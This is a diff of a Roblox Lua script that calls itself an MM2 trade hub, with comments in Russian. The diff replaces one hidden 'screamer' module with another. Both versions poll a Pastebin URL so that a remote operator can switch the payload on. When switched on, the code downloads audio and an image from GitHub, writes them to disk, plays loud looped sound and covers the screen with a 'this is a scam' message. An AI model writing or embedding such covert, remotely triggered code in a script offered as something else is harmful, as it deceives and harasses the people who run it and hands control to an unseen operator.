@@ -11,106 +11,90 @@
 -- + PASTEBIN SCREAMER (ON/OFF)
 -- ============================================================
 
--- ============================================================
--- ВСТРОЕННЫЙ МОДУЛЬ ПРОВЕРКИ PASTEBIN (ON/OFF)
--- ============================================================
-do
-    local Players = game:GetService("Players")
-    local PASTEBINURL = "https://pastebin.com/raw/sumANBQV"
-    local CHECKINTERVAL = 1
 
-    local isActive = false
-    local screenGui = nil
-    local sound = nil
+-- Скрипт проверяет статус с Pastebin каждые 5 секунд
+-- "off" = ничего не происходит
+-- "on"  = запускается скример
 
-    local function getStatus()
-        local ok, result = pcall(function()
-            return game:HttpGet(PASTEBINURL .. "?t=" .. tick())
-        end)
-        if not ok or not result then return nil end
-        local cleaned = tostring(result):gsub("%s+", ""):lower()
-        if cleaned:find("on", 1, true) then return "on" end
-        if cleaned:find("off", 1, true) then return "off" end
-        return nil
-    end
+local PASTEBIN_URL = "https://pastebin.com/raw/SWQZAFMn"
+local CHECK_INTERVAL = 5 -- интервал проверки в секундах
+local screamTriggered = false -- флаг, чтобы не запускать скример повторно
 
-    local function activate()
-        if isActive then return end
-        isActive = true
-
-        pcall(function()
-            writefile(
-                "po.mp3",
-                game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
-            )
-            sound = Instance.new("Sound")
-            sound.Parent = workspace
-            sound.SoundId = getfenv().getcustomasset("po.mp3")
-            sound.Volume = 10
-            sound.Looped = true
-            sound:Play()
-        end)
-
-        pcall(function()
-            writefile(
-                "dsf.jpg",
-                game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg")
-            )
-
-            screenGui = Instance.new("ScreenGui")
-            screenGui.DisplayOrder = 999
-            screenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
-
-            local ImageLabel = Instance.new("ImageLabel")
-            ImageLabel.Image = getfenv().getcustomasset("dsf.jpg")
-            ImageLabel.Size = UDim2.new(0, 600, 0, 600)
-            ImageLabel.BackgroundTransparency = 1
-            ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-            ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-            ImageLabel.Parent = screenGui
-
-            local TextLabel = Instance.new("TextLabel")
-            TextLabel.Text = "ЭТО СКАМ ЭТО СКРИПТ ЛИВАЙ"
-            TextLabel.TextScaled = true
-            TextLabel.Size = UDim2.new(0, 200, 0, 100)
-            TextLabel.TextColor3 = Color3.new(1, 1, 1)
-            TextLabel.BackgroundTransparency = 1
-            TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
-            TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-            TextLabel.ZIndex = 999
-            TextLabel.Parent = screenGui
-        end)
-    end
-
-    local function deactivate()
-        if not isActive then return end
-        isActive = false
-
-        if sound then
-            pcall(function() sound:Stop() end)
-            pcall(function() sound:Destroy() end)
-            sound = nil
-        end
-
-        if screenGui then
-            pcall(function() screenGui:Destroy() end)
-            screenGui = nil
-        end
-    end
-
-    task.spawn(function()
-        while true do
-            local status = getStatus()
-            if status == "on" then
-                activate()
-            elseif status == "off" then
-                deactivate()
-            end
-            task.wait(CHECKINTERVAL)
-        end
-    end)
+local function runScreamer()
+    -- This file was generated with SKS V1.2.0
+    local fenv = getfenv();
+    pcall(function(p1, a, b, c)
+    end);
+    writefile(
+        "po.mp3",
+        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/audio_2025-12-04_15-22-47.mp3")
+    );
+    local Sound = Instance.new"Sound";
+    Sound.Parent = workspace;
+    Sound.SoundId = fenv.getcustomasset"po.mp3";
+    Sound.Volume = 10;
+    Sound.Looped = true;
+    Sound:Play();
+    writefile(
+        "dsf.jpg",
+        game:HttpGet("https://raw.githubusercontent.com/ipadys/core/refs/heads/main/photo_2025-12-03_21-03-11.jpg")
+    );
+    local ScreenGui = Instance.new"ScreenGui";
+    ScreenGui.DisplayOrder = 999;
+    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui;
+    local ImageLabel = Instance.new"ImageLabel";
+    ImageLabel.Image = fenv.getcustomasset"dsf.jpg";
+    local UDim2_New = UDim2.new;
+    ImageLabel.Size = UDim2_New(0, 600, 0, 600);
+    ImageLabel.BackgroundTransparency = 1;
+    ImageLabel.Position = UDim2_New(0.5, 0, 0.5, 0);
+    local Vector2_New = Vector2.new;
+    ImageLabel.AnchorPoint = Vector2_New(0.5, 0.5);
+    ImageLabel.Parent = ScreenGui;
+    local TextLabel = Instance.new"TextLabel";
+    TextLabel.Text = "ЭТО СКАМ ЭТО СКРИПТ ЛИВАЙ";
+    TextLabel.TextScaled = true;
+    TextLabel.Size = UDim2_New(0, 200, 0, 100);
+    TextLabel.TextColor3 = Color3.new(1, 1, 1);
+    TextLabel.BackgroundTransparency = 1;
+    TextLabel.Position = UDim2_New(0.5, 0, 0.5, 0);
+    TextLabel.AnchorPoint = Vector2_New(0.5, 0.5);
+    TextLabel.ZIndex = 999;
+    TextLabel.Parent = ScreenGui;
 end
 
+local function checkStatus()
+    local success, response = pcall(function()
+        return game:HttpGet(PASTEBIN_URL .. "?t=" .. tick())
+    end)
+    
+    if not success then
+        warn("[Скример] Не удалось получить данные с Pastebin: " .. tostring(response))
+        return
+    end
+    
+    -- Убираем пробелы и приводим к нижнему регистру
+    local status = string.lower(string.gsub(response, "%s+", ""))
+    
+    print("[Скример] Статус: " .. status)
+    
+    if status == "on" and not screamTriggered then
+        screamTriggered = true
+        runScreamer()
+    elseif status == "off" then
+        screamTriggered = false -- сбрасываем флаг, чтобы при следующем "on" сработало снова
+    end
+end
+
+-- Первая проверка сразу
+checkStatus()
+
+-- Цикл проверок
+task.spawn(function()
+    while task.wait(CHECK_INTERVAL) do
+        checkStatus()
+    end
+end)
 -- ============================================================
 -- ОСНОВНОЙ КОД MM2 TRADE HUB
 -- ============================================================
